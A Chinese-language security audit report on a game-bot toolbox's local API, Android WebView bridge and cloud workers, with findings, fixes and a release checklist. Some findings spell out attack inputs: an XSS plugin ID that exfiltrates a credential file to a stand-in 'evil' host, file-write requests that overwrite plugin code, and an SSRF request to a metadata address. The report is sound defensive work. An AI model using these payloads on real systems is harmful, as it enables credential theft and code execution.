# 游园工具箱安全审查报告

- **审查时间**：2026-10-20
- **审查方式**：只读静态审查（Read / Grep / Glob / `git ls-files` / `git log`）。未修改任何源码，未执行构建、部署或网络请求。
- **审查范围（实际读过的文件/目录）**：
  - 根：`AGENTS.md`、`.gitignore`、`git ls-files`（4593 个入库文件）、`git log --all --diff-filter=A -- '*.pem' ...`、`git log -S"BEGIN PRIVATE KEY"`
  - `upstream/`：`main.go`（路由注册 4850-5098、`handleConfig`、`handleFileUpload`、`handlePluginDelete`、`handleBotConsole`、`handlePluginFileRead/Write`）、`youyuan_remote.go`、`youyuan_identity.go`、`youyuan_pool_identity.go`、`youyuan_global_capture.go`、`youyuan_capture_runtime.go`、`youyuan_capture_reconcile.go`、`youyuan_capture_admission.go`、`youyuan_selector_camera.go`、`youyuan_observer_watch.go`、`youyuan_observer_handoff.go`、`youyuan_observer_bridge.go`、`youyuan_entity_observations.go`、`youyuan_sense.go`、`youyuan_host_files.go`、`youyuan_import.go`、`plugin_pack.go`、`plugin_edit.go`、`youyuan_agent.go`、`youyuan_tunnel.go`、`youyuan_product.go`、`integrity.go`、`apk_signing.go`、`youyuan_download_headers.go`、`youyuan_provider_routing.go`、`youyuan_notices.go`、`preview_handler.go`、`web_http.go`、`config/config.go`
  - `upstream/frontend/`：`index.html`、`js/youyuan_dashboard.js`、`js/youyuan.js`、`js/pages/plugins.js`、`js/pages/settings.js`、`js/utils.js`、`js/sse.js`、`js/youyuan_accounts.js`、`js/youyuan_identity.js`、`js/youyuan_sense.js`、`js/youyuan_room_discovery.js` 等
  - `upstream/android/`：`app/build.gradle`、`app/src/main/java/com/prismtool/box/MainActivity.java`、`AndroidUpdateManager.java`
  - `cloudflare/`：`worker.mjs`、`identity.mjs`、`updates.mjs`、`wrangler.jsonc`、`public/updates/android/latest.json`
  - `auth-service/`：`worker.mjs`、`vault.mjs`、`wrangler.jsonc`、`go.mod`
  - `linux/`：`direct_gateway.py`、`direct_tunnel.py`、`*.service`、`*.sh`
  - `observer-bridge/`：目录清单（未逐行审计客户端）
  - `private/`：空目录（未入库）

## 风险统计

| 等级 | 数量 |
|---|---|
| 高危 | **6** |
| 中危 | **9** |
| 低危 | **7** |
| 已确认安全 | **13** |

> 总判断：**云端中继（Cloudflare Worker）与 Linux 直连网关的鉴权是可靠的**；**APK/桌面宿主本机的控制台 API 完全没有鉴权，且对任意网页开放 CORS**。这是本次审查的根因级问题，下列 3 条高危都是它的直接后果。

---

## 一、高危（上架前必须修）

| # | 风险 | 位置（文件:行号） | 攻击场景（具体怎么利用） | 影响 | 修复方案 |
|---|---|---|---|---|---|
| H1 | **本机控制台 API 零鉴权 + 全局 `Access-Control-Allow-Origin: *`** | `upstream/main.go:5079-5081`、`upstream/youyuan_download_headers.go:6-8`、`upstream/main.go:5096` | 宿主监听 `127.0.0.1:19429`，但 CORS 头对**所有来源**放行，且允许 `Authorization` 请求头。用户只要在浏览器打开任意恶意页面（APK 在后台运行），该页面即可 `fetch('http://127.0.0.1:19429/api/config')` 并**读取响应体**；POST 用 `Content-Type: text/plain` 即可绕过预检（Go 端 `json.Decoder` 不校验 Content-Type）。实测路径：`/api/bot/console`（`main.go:1158-1184`）直接 `SendConsole(input)`，等于以 OP 身份执行任意 MC 命令（含 `kick`）。 | 任意网页 → 完全控制本机工具箱：踢人、改配置、删插件、停抓包、读凭据。**上架阻断级**。 | ① 所有 `/api/*` 增加会话鉴权（启动时生成随机 token，注入前端并在 `fetch` 拦截器统一带 `Authorization`）；② CORS 改为来源白名单（仅 `http://127.0.0.1:<port>`），或对无 `Origin` 之外一律拒绝；③ 写操作校验 `Origin`/`Sec-Fetch-Site`；④ 增加 `SameSite=Strict` 会话 Cookie 或自定义头双提交。 |
| H2 | **凭据接口无鉴权：游戏 Token、服务器密码、MCP 密钥、云账号 `control_token` 明文下发** | `upstream/main.go:577-578`（`writeJSON(... "config": cfg)`）、`upstream/config/config.go:11-15`（`Token`/`MarketToken`/`ServerPass` 均无 `json:"-"`）、`upstream/youyuan_remote.go:135`（`"key": yyRemote.Key`）、`upstream/youyuan_identity.go:136`（`"control_token": yyIdentity.Data.Control`） | 浏览器 `GET http://127.0.0.1:19429/api/config` 一次性拿到 `token`（网易游戏登录令牌）、`server_pass`、`market_token`；`GET /api/youyuan/identity` 拿到 `control_token`。该 `control_token` 在云端被当作**完整会话**解析：`cloudflare/identity.mjs:41` `ctx.storage.get('control:'+hash)` 命中即返回用户身份，`cloudflare/worker.mjs:45` 用它走 `identityResolve(...,'session')`。攻击者随后直连 `https://toolbox.youyuanqi.dpdns.org/api/...`，以受害者身份操作其设备、资料库、机器人账号池。 | 账号接管 + 游戏账号被盗 + 云端设备被远控。 | ① `AppConfig` 的敏感字段出参时脱敏（返回 `has_token`/`token_hint`，绝不回明文）；② `/api/youyuan/identity` 不返回 `control_token`，改为一次性换取；③ `control_token` 在云端**不应**作为 `session` 用途解析（`identity.mjs:41` 删除 `control:` 回退）；④ 敏感 GET 全部要求鉴权（同 H1）。 |
| H3 | **任意文件写入（可写插件代码 → 代码执行）** | `upstream/preview_handler.go:704` `os.WriteFile(req.Path, data, 0644)`；`upstream/main.go:1840-1849` `outputDir`/`filename` 直接拼接 `dstPath = outputDir + "/" + filename` | `POST /api/preview/save-image {"path":"/data/data/org.youyuan.toolbox/files/插件/xxx/main.py","data":"<base64>"}`，或 `POST /api/file/upload` 带 `output_dir=..&filename=../../files/插件/x/main.py`。随后触发插件重载（`/api/plugin/reload`），Python/C++ 插件在宿主进程内运行 → 任意代码执行。无需任何凭据，配合 H1 可由网页直接发起。 | 本地任意代码执行；可读取全部凭据、劫持机器人、向外回传数据。 | ① 两处都改为「仅允许写入受控根目录下的相对路径」，复用已有的 `yyProjectPath(root, raw)`（`upstream/youyuan_agent.go:122-145`，该函数已有完善校验）；② 拒绝绝对路径、`..`、盘符、`:`；③ 写前 `filepath.Rel` 复核；④ 该接口增加鉴权。 |
| H4 | **DOM XSS + WebView 原生桥无隔离，可读任意私有文件** | 注入点 `upstream/frontend/js/pages/plugins.js:64`（`onchange="plgSwitch(\'' + p.id + '\',this.checked)"`，`p.id` 未转义）；ID 校验 `upstream/plugin_pack.go:39-48`（`validPluginID` **不拒绝单引号**）；桥 `MainActivity.java:122`、`436-467`（`readFileAsBase64(String path)` 无路径限制）；无 CSP（全仓 grep 无 `Content-Security-Policy`） | 构造插件包，`manifest.json` 的 `id` 设为 `a');fetch('https://evil/?d='+encodeURIComponent(android.readFileAsBase64('/data/data/org.youyuan.toolbox/files/youyuan-remote.json')))//`。用户从云端资料库/好友处导入后打开「插件管理」，脚本在 WebView 内执行，通过 `window.android.readFileAsBase64` 读取 `youyuan-remote.json`（含 `device_token`）、`config.json`（含游戏 Token）并外传；还可调用 `installUpdate`、`toggleFloatingWindow`。 | 一条插件即可窃取全部本机凭据；WebView 内 JS 拥有原生能力，等同本地提权。 | ① `plugins.js:64` 改用 `escHtml(p.id)` 并对单引号做 JS 字符串转义（或改为 `dataset` + 事件委托，不拼内联 `onclick`）；② `validPluginID` 拒绝 `'` `"` `(` `)` `` ` ``；③ 所有 `innerHTML` 拼接统一走 `yyEscape`；④ 增加 CSP（`default-src 'self'; script-src 'self'`，禁用内联事件）；⑤ `readFileAsBase64` 限定在 `getFilesDir()` 下的白名单子目录。 |
| H5 | **红线第 9 条在 API 层未强制：观测目标不过滤已知机器人** | `upstream/youyuan_selector_camera.go:69-78`（`excluded` 仅含 `self` + `Config.ExcludePlayers`）；`upstream/youyuan_observer_handoff.go:245`、`292`（`next_player` 未校验是否为机器人） | 直接调用 `POST /api/youyuan/observer/watch`（或 `observerBridge.watchStart`）并传 `auto_players=true`，`targets()` 会把 `playerInfoMgr.OnlineSet()` 里**所有**在线玩家当作目标，包括同项目的其他机器人账号 → 机器人互相观测、互相投放相机/TP，形成递归；`handoff` 的 `next_player` 也可直接指定另一台机器人。 | 违反 `AGENTS.md:9`「多机器人观测必须排除已知机器人身份；未知身份不得触发递归投放」；产生无意义的互相观测流量与误判样本，且是上架合规硬伤。 | ① `yyWatch.targets()` 内调用 `yyCaptureRobotNames()` 做二次排除（该函数已存在，`youyuan_capture_runtime.go:242`），并在 `AutoPlayers` 分支强制生效；② `watchStart` 收到 `players` 时逐个校验不在机器人集合；③ `handoff` 的 `next_player` 同样校验；④ 机器人身份未知（`identitiesKnown=false`）时禁止 `auto_players`。 |
| H6 | **对第三方服务器玩家自动执行 `kick`（越权处置）** | `upstream/youyuan_capture_admission.go:52-56` `bm.SendWSCommandWithTimeout(fmt.Sprintf("kick %s %s", q, reason), ...)`；开关 `EnforceLimit`/`PlayerLimit`（`youyuan_global_capture.go:31-33`） | 用户在任意服务器开启「玩家上限」，程序以 OP 身份对超限玩家下发 `kick`。这不是本地操作，而是**对他人服务器内的真实玩家执行管理动作**。`AGENTS.md:7` 要求「仅使用获授权的服务」。 | 合规/法律风险（未授权管理他人服务器）；被平台判定为恶意功能；玩家投诉。 | ① 默认关闭并在 UI 明确「需服务器管理员书面授权」；② 仅对 `ServerCode` 属于用户自有/已授权清单的服务器生效（新增 `authorized_servers` 配置并在服务端校验）；③ 上架版本建议**移除**该能力，保留只读观测。 |

---

## 二、中危

| # | 风险 | 位置（文件:行号） | 攻击场景 / 说明 | 修复方案 |
|---|---|---|---|---|
| M1 | **`yyModuleAllowed` / `admin:true` 是纯前端隐藏，后端无任何校验（典型「看起来修了其实没修」）** | 前端：`upstream/frontend/js/youyuan_dashboard.js:101` `function yyModuleAllowed(m){return !m||!m.admin||(typeof yyAccountAdmin==='function'&&yyAccountAdmin())}`；`yyAccountAdmin` 取客户端变量 `upstream/frontend/js/youyuan_accounts.js:186`。后端：`upstream/youyuan_remote.go:137-139` `mux.HandleFunc("/api/youyuan/catalog", func(...){ writeJSON(w, ..., "routes": yyAPIRoutes) })`，**无角色判断**；`youyuan_catalog.go` 中亦无 `Admin` 引用 | **明确结论：绕过成本为 0。** ① 控制台里执行 `yyPlatformUser={role:'admin'}` 模块即出现；② 更直接：`curl http://127.0.0.1:19429/api/youyuan/catalog` 直接拿到全部路由清单，与登录与否、是否管理员无关。前端过滤只影响「看不看得见按钮」。 | 后端对 `/api/youyuan/catalog`、`/api/youyuan/docs` 等「开发者向」接口做角色校验（`yyPoolActorRequest` 已有 `actor.Admin`）；前端过滤仅作体验优化，不得作为安全边界。 |
| M2 | **APK 完整性校验的包名常量写错，且权威路径从不校验包名；`latest.json` 的 `signing_cert_sha256` 无人消费（两处「假修复」）** | `upstream/integrity.go:21` `const officialPkgName = "com.prismtool.box"`；实际 `upstream/android/app/build.gradle:6` `applicationId 'org.youyuan.toolbox'`；`integrity.go:111-126` 权威分支命中后直接 `return`，**永远走不到** `apkPkgName` 校验（129-143）；`cloudflare/public/updates/android/latest.json:9` `"signing_cert_sha256": "cd8236..."`，全仓 grep 仅此一处出现，Go/Java/JS 均未读取；`integrity.go:14-18` 白名单为 `38083b…/1a250d…/f4847e…`，**不含** `cd8236…` | 包名篡改检测实际失效（只剩签名白名单兜底，改包名必重签故仍会被拦，影响有限）；更新清单里的 `signing_cert_sha256` 是装饰字段，与硬编码白名单还不一致 → 一旦换签名密钥，会出现「更新器接受、启动后被判篡改」的自相矛盾。 | ① `officialPkgName` 改为 `org.youyuan.toolbox`；② 权威分支也校验包名；③ 删除 `latest.json` 的 `signing_cert_sha256` 或让客户端真正比对它；④ 把三把历史密钥收敛为「当前密钥 + 显式过渡期」。 |
| M3 | **玩家 XUID/UUID 明文暴露给任意本机调用方** | `upstream/youyuan_sense.go:230` `e["xuid"] = a.XUID`；`youyuan_sense.go:881` `extras := map[string]any{"uuid": a.UUID, "xuid": a.XUID, ...}`；入口 `youyuan_observations.go` / `/api/youyuan/observations` | 任意网页（H1 的 CORS）可枚举当前服务器内所有玩家的 **Xbox XUID**（跨游戏稳定身份标识）。这是 `AGENTS.md:8` 意义上的身份信息，不应无鉴权批量外泄。 | 观测接口加鉴权；默认只返回 `name` + `runtime_id`，`xuid`/`uuid` 需显式 `include_identity=1` 且仅管理员可见；日志与导出中默认脱敏。 |
| M4 | **SSRF + 令牌外发：`market_url` 可指向任意主机，`/api/market-proxy` 会带上设备令牌** | `upstream/youyuan_provider_routing.go:12-19`（仅校验 `http/https` 与 `Host != ""`，**允许任意主机、允许 http**）；`upstream/main.go:1974-1995`（`target := yyMarketOrigin(cfg) + p`，透传 `Authorization`）；`main.go:607-609`（`AuthURL == MarketURL` 时把游戏 `Token` 赋给 `MarketToken`） | `POST /api/config {"market_url":"http://169.254.169.254","auth_url":"http://169.254.169.254"}` → `GET /api/market-proxy/latest/meta-data/` 拿到云元数据；若同时把两者设为攻击者域名，`yyMarketCredential` 会把 `Bearer <游戏Token>` 发给攻击者。 | ① `yyProviderURL` 拒绝内网/回环/链路本地地址与 `http`（至少禁止私网）；② `market-proxy` 只允许编译期常量域名；③ 绝不因 `AuthURL==MarketURL` 自动把游戏 Token 当市场令牌。 |
| M5 | **账号池归属校验可被「不带 actor 头」整体跳过** | `upstream/youyuan_pool_identity.go:99-101` `if !yyPoolHasActor(r){ return nil }`；`youyuan_pool_identity.go:50-56` 无 `X-YouYuan-Actor` 时回退为本地绑定身份 | 云端中继的 `sharedPoolAllowed`（`cloudflare/worker.mjs:131-135`）是有效边界，但本机 API 上「不发送 actor 头」即视为本地所有者，所有 `yyPoolCanUse` 校验失效。配合 H1，任意网页可直接操作账号池（含删除账号、读取令牌）。 | 本机 API 也要求鉴权（H1）；`yyPoolInvocationAllowed` 在无 actor 头时仍应校验「调用方是本机已登录会话」。 |
| M6 | **依赖无锁文件、使用 `^` 浮动版本** | `editor/package.json:1`（`codemirror:^6.0.0`、`esbuild:^0.25.0` 等，无 `package-lock.json`）；`upstream/go.mod:3` 声明 `go 1.26` | 构建期 `npm install` 会拉取任意新的 minor/patch，存在供应链投毒与构建不可复现风险。Go 侧 `go.sum` 存在（已确认），风险低。 | 提交 `package-lock.json`，CI 用 `npm ci`；锁定精确版本。 |
| M7 | **游戏凭据明文落盘** | `upstream/config/config.go:122-133`（`json.MarshalIndent` 后 `os.WriteFile(temp, data, 0600)`）；字段 `Token`/`ServerPass`/`MarketToken` | 文件权限 0600 已做对，但内容为明文；root/备份/云同步/`adb backup` 场景下可被直接读取。 | Android 用 Keystore 加密（`EncryptedFile`/AES-GCM），桌面用系统钥匙串；至少对 `server_pass` 单独加密。 |
| M8 | **`.gitignore` 未覆盖 `*.pem` / `*.key`** | `.gitignore:1-25`（有 `*.keystore`、`*.jks`，**无** `*.pem`、`*.key`） | 当前入库的 `linux/test_direct_tunnel_fixtures/localhost-key.pem` 是**用户批准**的测试私钥（已核实，不算问题）；但规则缺失意味着后续真实私钥可能被误提交。 | 追加 `*.pem`、`*.key`、`*.p12`、`*.crt`（并对 fixture 目录用 `!` 例外显式放行）。 |
| M9 | **插件导入接受任意本地路径** | `upstream/main.go:735-745` `pluginController.ImportPackage(req.Path)`（`req.Path` 直接来自请求体，无根目录限制） | `POST /api/plugin/import {"path":"/sdcard/Download/x.zip"}` 可读取进程有权限的任意 zip 并安装。本身不泄露内容，但可被用来探测文件存在性、加载非用户预期的包。 | 限定在应用私有目录/SAF 返回的 URI 内；路径做 `filepath.Rel` 复核。 |

---

## 三、低危 / 加固建议

| # | 项 | 位置 | 说明 / 建议 |
|---|---|---|---|
| L1 | Cloudflare `account_id` 入库 | `cloudflare/wrangler.jsonc:4`、`auth-service/wrangler.jsonc:4` | 账号标识非密钥，但可用于社工与配额探测。建议改由 `CLOUDFLARE_ACCOUNT_ID` 环境变量注入。 |
| L2 | `workers_dev: true` 双入口 | `cloudflare/wrangler.jsonc:5`、`auth-service/wrangler.jsonc:5` | 同一 Worker 同时暴露 `*.workers.dev`，绕过自定义域名的 WAF/限速策略。生产建议关闭。 |
| L3 | 口令哈希强度偏低 | `cloudflare/identity.mjs:5` `PBKDF2 ... iterations:100000` | 低于 OWASP 2023 对 PBKDF2-HMAC-SHA256 的 600k 建议。建议提到 600k 或改 Argon2id。 |
| L4 | 会话 30 天且登录即清旧会话 | `cloudflare/identity.mjs:124` `expires:now+30*86400000` | 无滑动续期/设备指纹。建议缩短到 7 天并支持「退出所有设备」。 |
| L5 | 无任何安全响应头 | 全仓 grep 无 `Content-Security-Policy` / `X-Frame-Options` / `X-Content-Type-Options` | 直接放大 H4 的 XSS 影响（可被任意内联脚本执行、可被 iframe 嵌套点击劫持）。 |
| L6 | vendored 代码对 base64 salt 做 `TrimRight("=")` | `upstream/flowers-for-machines/core/minecraft/conn.go:965`、`upstream/flowers-for-machines/tanlobby/minecraft/conn.go:840` | 第三方代码，非本项目鉴权逻辑；**未发现**由此产生鉴权绕过，但与标准 base64 不一致，建议核对上游行为。 |
| L7 | 日志保留玩家名 + 聊天原文 | `upstream/bot_conn.go:766` `fmt.Sprintf("[聊天] %s: %s", p.SourceName, p.Message)` | 属产品功能（聊天记录），但无脱敏、无保留期限说明。建议：UI 明示「仅本机保存」、提供一键清空、导出时脱敏 UID。 |

**关于「日志脱敏」的核实结论**：全仓 grep `logln`/`log.Printf` 后跟 `token|pass|secret|key|uid|ip` 的组合**无命中**；连接日志只打印服务器/房间号，不打印 Token。`youyuan_mcp_telemetry.go:12` 明确注释「Metadata only: no prompts, command text, keys, file contents or raw packets」，实现与注释一致（只记录动词/状态/结果分类）。**日志脱敏这一项基本合格**，唯一例外是 L7 的聊天原文。

---

## 四、已确认安全的关键项（附证据）

| # | 结论 | 证据 |
|---|---|---|
| S1 | **云端中继的鉴权是真实有效的**，不是摆设 | `cloudflare/worker.mjs:84-96`：`protectedPath` 覆盖 `/api/*`、`/mcp*`、`/device/connect`、`/health`；未通过时返回 401；`env.CONSOLE_TOKEN` 未配置时 `!expected.slice(7)` 直接判失败（不会「空 token 放行」）。 |
| S2 | **MCP 密钥比较使用常量时间，不可计时爆破** | `upstream/youyuan_remote.go:221-230` `subtle.ConstantTimeCompare([]byte(supplied), []byte(key)) != 1` → 401。 |
| S3 | **Linux 直连网关有来源白名单 + 令牌校验**（与 APK 本机形成鲜明对比，说明「本该有的防护」是可行的） | `linux/direct_gateway.py:65-69`：`if origin and origin not in ALLOWED_ORIGINS: 403`；`if protected and not login and not authenticate(token): 401`；`authenticate` 用 `hmac.compare_digest` 且回源 `/api/identity/me` 校验 `owner_id` + `cloud_allowed`。 |
| S4 | **APK 公网临时隧道只暴露 MCP，不暴露控制台** | `upstream/youyuan_tunnel.go:119-133`：`yyTunnelPublicHandler` 仅处理 `/mcp`、`/mcp/link/`、`/health`、`/`，其余 `http.NotFound`。前端「只暴露 MCP」的说法与代码一致。 |
| S5 | **ZIP 解压有完整 zip-slip 防护** | `upstream/youyuan_import.go:19-25`（拒绝 `/`、`..`、绝对路径、`:`、符号链接、重复路径）；`upstream/plugin_pack.go:15-30` + `:68`（`zipSlipSafe` 逐段拒绝 `..`）；另有 64MB/条目数上限防 zip 炸弹。 |
| S6 | **插件编辑器路径穿越防护完善** | `upstream/youyuan_agent.go:122-145` `yyProjectPath`：拒绝绝对路径、`..`、盘符、`:`，`filepath.Rel` 复核，并逐段 `Lstat` 拒绝符号链接；`plugin_edit.go:146-178` 全部经它解析。 |
| S7 | **上传文件名做了白名单校验** | `upstream/youyuan_host_files.go:18-20` `valid()` 拒绝空/`.`/`..`/`/`/`\`/`\x00`；下载同样校验（`:96-101`）。 |
| S8 | **APK 自更新确实校验了签名，不是「只校验 SHA」** | `AndroidUpdateManager.java:82` 校验 size+SHA256；`:85` 校验包名；`:88-89` 校验版本号；**`:90` `if(!signatures(archive).equals(signatures(current))) throw ...`** —— 与**当前已安装应用**的签名证书集合逐一比对。下载地址被钉死：`:38` 强制 `https` + `updates.youyuanqi.dpdns.org` + 固定 path + 无 userinfo + 无自定义端口；`:48` `setInstanceFollowRedirects(false)`。`upstream/youyuan_product.go:40` 服务端侧同样校验清单字段与 URL。**结论：中间人替换 APK 会因签名不一致被拒；此链路合格。** 遗留问题见 M2（未使用清单里的 `signing_cert_sha256` 做固定锚点）。 |
| S9 | **观测桥上行业务有独立令牌，且常量时间比较** | `upstream/youyuan_observer_bridge.go:246-263` 仅接受 POST 且走 `yyObserver.ingest(token,...)`；`:266-272` `len(token)==64` + `sha256` + `subtle.ConstantTimeCompare`。 |
| S10 | **全局抓包在「实际执行层」确实排除了机器人**（不是只写在文档里） | `upstream/youyuan_capture_reconcile.go:170-174`：`o["auto_players"]=false`、`o["players"]=a.Players`（来自 `yyCapturePlayers(excluded)`）、`o["exclude_players"]=excluded`；`youyuan_capture_runtime.go:346-359` 用 `excluded` 过滤在线集合。**注意**：这只覆盖 reconcile 路径，直连 `watchStart` 仍可绕过 → 见 H5。 |
| S11 | **认证服务令牌不可伪造、有明确过期** | `auth-service/vault.mjs`：`token()` 为 32 字节 CSPRNG 十六进制；会话用 AES-GCM `seal/open`（`additionalData` 绑定上下文）而非明文/可预测 ID；`auth-service/worker.mjs:63` 校验 `session.expires`；登录令牌以 `hash(login_token)` 索引（`worker.mjs:170`），库中不存明文。 |
| S12 | **git 历史中没有生产密钥** | `git ls-files` 仅命中测试材料：`linux/test_direct_tunnel_fixtures/localhost-{cert,key}.pem`（**用户已批准入库的测试私钥**，不算问题）、`third_party/cloudflared/**/test*.pem`；`git log --all -S"BEGIN PRIVATE KEY"` 只命中两个基线提交，内容即上述 fixture。未发现 `AKIA`、`ghp_`、`sk-`、生产 RSA/EC 私钥。`private/`、`build/`、`cloudflare/public/` 均已由 `.gitignore` 覆盖且不在索引中（`private/` 目录为空）。 |
| S13 | **「未知身份不触发动作」这一条在踢人链路上是真的** | `upstream/youyuan_capture_admission.go:28` `if !x.Connected || !x.OP || !x.RobotsKnown || x.PrimaryName == "" || session.IsZero() { return x }` —— 机器人身份未知时直接返回空快照，`reject` 不会执行；`:41-46` 还复核了 generation/连接会话，避免配置变更后误踢。 |

---

## 五、上架前安全 Checklist（可勾选、可执行）

### A. 阻断项（不做完不许上架）

- [ ] **A1** 本机 `/api/*` 全部加鉴权：启动生成 32 字节随机 token → 注入 `index.html`（`<meta name="yy-token">` 或 `window.__YY_TOKEN__`）→ 前端 `A()` 统一带 `Authorization` → Go 侧中间件校验（除 `/health`）。验证：`curl http://127.0.0.1:19429/api/config` 必须 401。
- [ ] **A2** CORS 收紧：`Access-Control-Allow-Origin` 只回显 `http://127.0.0.1:<port>`；`Origin` 不在白名单直接 403；删除 `Access-Control-Allow-Headers` 里的 `Authorization`（改为同源）。验证：从 `https://example.com` 控制台 `fetch` 必须被浏览器拦截。
- [ ] **A3** `/api/config` GET 出参脱敏：只返回 `has_token`/`token_hint`（前 5 位 + `…`）/`has_server_pass`；`/api/youyuan/remote` 不返回 `key`；`/api/youyuan/identity` 不返回 `control_token`。
- [ ] **A4** `identity.mjs:41` 删除 `control:` 作为 session 的回退；`control_token` 仅用于 `/api/identity/binding`。
- [ ] **A5** `preview_handler.go:704` 与 `main.go:1849` 改用 `yyProjectPath` 校验，拒绝绝对路径/`..`/盘符。验证：`POST /api/preview/save-image {"path":"/tmp/x","data":"QQ=="}` 必须失败。
- [ ] **A6** `plugins.js:64` 的 `p.id` 改为 `escHtml` + JS 转义（或事件委托）；`validPluginID` 拒绝 `'` `"` `` ` `` `(` `)`。
- [ ] **A7** 增加 CSP：`default-src 'self'; script-src 'self'; object-src 'none'; frame-ancestors 'none'`；同时补 `X-Content-Type-Options: nosniff`、`Referrer-Policy: no-referrer`。
- [ ] **A8** `readFileAsBase64` 限制在 `getFilesDir()` 白名单子目录，拒绝绝对路径与 `..`。
- [ ] **A9** `yyWatch.targets()` 强制排除 `yyCaptureRobotNames()`；`watchStart`/`handoff.next_player` 校验目标不是机器人；身份未知时禁用 `auto_players`。
- [ ] **A10** 踢人能力：默认关闭 + 服务器授权白名单，或上架版本直接移除。

### B. 发布前必须确认

- [ ] **B1** `integrity.go:21` 改为 `org.youyuan.toolbox`，并让权威分支也校验包名。
- [ ] **B2** 删除 `latest.json` 的 `signing_cert_sha256`，或让 `AndroidUpdateManager.verify` 真正比对它；确保白名单与当前签名证书一致（当前清单 `cd8236…` **不在** `integrity.go:14-18` 白名单内，必须先对齐，否则新版本会被判篡改）。
- [ ] **B3** `/api/youyuan/catalog` 与 `/api/youyuan/docs` 增加 `actor.Admin` 校验。
- [ ] **B4** `yyProviderURL` 拒绝私网/回环/链路本地地址与 `http`；`market-proxy` 目标域名改为常量。
- [ ] **B5** 观测接口默认不返回 `xuid`/`uuid`；导出/日志默认脱敏。
- [ ] **B6** 提交 `editor/package-lock.json`，CI 使用 `npm ci`。
- [ ] **B7** `.gitignore` 增加 `*.pem`、`*.key`、`*.p12`、`*.crt`（对 `linux/test_direct_tunnel_fixtures/` 用 `!` 显式放行并加注释说明已获批）。
- [ ] **B8** `wrangler.jsonc` 移除 `account_id` 字面量、关闭 `workers_dev`。
- [ ] **B9** `PBKDF2` 迭代提到 600k（或 Argon2id）；会话有效期缩到 7 天。
- [ ] **B10** 游戏凭据改 Keystore/钥匙串加密存储。

### C. 回归验证（每次发版跑一遍）

- [ ] **C1** 断网启动 → 控制台可用、无外发请求（抓包确认只有本地 19429）。
- [ ] **C2** 未登录状态直接 `curl` 所有写接口，全部 401（脚本化：`/api/config`、`/api/plugin/delete`、`/api/bot/console`、`/api/preview/save-image`、`/api/youyuan/remote`、`/api/youyuan/identity`）。
- [ ] **C3** 用 `evil.html`（`fetch('http://127.0.0.1:19429/api/config')`）在 Chrome 打开，确认被 CORS 拦截且无数据回显。
- [ ] **C4** 导入一个 `id` 含 `'` 的测试插件，确认插件管理页无脚本执行（DevTools Console 无输出）。
- [ ] **C5** 用改造过的 APK（换签名）走更新流程，确认在 `verify()` 阶段被拒（`更新包签名与当前应用不一致`）。
- [ ] **C6** 开两台机器人 + 一名真人，开启全局抓包，确认 `watchStatus.config.players` 不含任何机器人名。
- [ ] **C7** `git ls-files | grep -Ei '\.pem$|\.key$|secret|token'` 复核无新增敏感文件；`git log -S"BEGIN PRIVATE KEY"` 复核无新增命中。

---

## 附：本次「看起来修了其实没修」清单（重点标注）

| 声称的修复 | 实际情况 | 证据 |
|---|---|---|
| 管理模块 `yyModuleAllowed` + `admin:true` 过滤 | **纯前端**。后端 `/api/youyuan/catalog` 无角色校验，`curl` 直接可取；前端判定变量可被控制台改写 | `youyuan_dashboard.js:101` vs `youyuan_remote.go:137-139`；`youyuan_accounts.js:186` |
| 更新清单带 `signing_cert_sha256`，签名不可变 | 客户端**从不读取**该字段；实际靠「与已安装签名比对」+ 硬编码白名单，且清单里的指纹不在白名单内 | `latest.json:9`（全仓唯一出现）vs `AndroidUpdateManager.java:90`、`integrity.go:14-18` |
| 重打包检测含「包名被修改」 | 权威分支 `return` 在前，包名分支永远不执行；且常量写的是 `com.prismtool.box`（旧包名） | `integrity.go:111-126` vs `:21`、`build.gradle:6` |
| 多机器人观测排除已知机器人 | reconcile 路径确实做了（S10），但 `watchStart` 直连与 `handoff.next_player` 未做，红线在 API 层未闭环 | `capture_reconcile.go:170-174` vs `selector_camera.go:69-78`、`observer_handoff.go:292` |
| 账号池「只能管理自己的机器人」 | 云端中继有效；本机 API 不带 actor 头即跳过归属校验 | `worker.mjs:131-135` vs `youyuan_pool_identity.go:99-101` |
| 控制台需要登录 | 前端 `yyIdentityGate` 只是遮罩；`handleIndex` 与所有 API 无服务端拦截 | `main.go:259-271`（无鉴权）、`youyuan_identity.js:12` |
